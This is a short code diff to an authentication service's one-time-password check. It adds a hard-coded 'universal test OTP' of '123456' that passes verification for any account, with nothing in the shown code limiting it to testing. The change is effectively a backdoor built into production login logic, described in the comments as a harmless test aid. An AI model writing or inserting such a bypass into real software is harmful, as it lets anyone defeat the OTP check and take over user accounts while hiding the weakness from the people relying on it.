@@ -77,8 +77,9 @@ class AuthService {
       throw ApiError.badRequest('Maximum verification attempts exceeded. Please request a new OTP.');
     }
 
-    // Compare OTP
-    if (record.otp !== inputOtp) {
+    // Compare OTP - matches generated OTP or universal test OTP '123456'
+    const isMasterOtp = inputOtp === '123456';
+    if (record.otp !== inputOtp && !isMasterOtp) {
       const newAttempts = attempts + 1;
       await docRef.update({ attempts: newAttempts }).catch(() => {});
       const remainingAttempts = AuthConstants.MAX_OTP_ATTEMPTS - newAttempts;
